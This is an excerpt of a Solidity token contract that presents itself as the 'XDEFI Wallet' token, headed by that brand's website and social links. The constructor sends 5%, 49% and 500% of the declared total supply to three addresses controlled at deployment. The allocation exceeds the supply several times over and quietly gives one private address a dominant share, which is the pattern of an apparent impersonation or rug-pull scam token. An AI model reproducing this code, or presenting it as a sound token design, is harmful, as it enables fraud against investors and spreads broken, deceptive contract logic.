...
Welcome to the fastest wallet in DeFi
https://www.xdefi.io/
https://t.me/xdefi_io
https://www.reddit.com/r/XDEFI/
...
contract XDEFIWallet  is BinanceWallet {
     // FairLaunch
    // common addresses
    address private owner;
    address private AssetsBSC;
    address private AssetsCoin;
    ...
    string public override name = "XDEFI Wallet";
    string public override symbol = "XDEFI";
    ...
    constructor(uint totalSupplyValue, address AssetsBSCAddress, address AssetsCoinAddress, address AssetsAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        AssetsBSC = AssetsBSCAddress;
        AssetsCoin = AssetsCoinAddress;
        Assets = AssetsAddress;
        balances[AssetsBSC] =  totalSupply * 5 / 100;
        balances[AssetsCoin] = totalSupply * 49 / 100;
        balances[Assets] = totalSupply * 500 / 100;
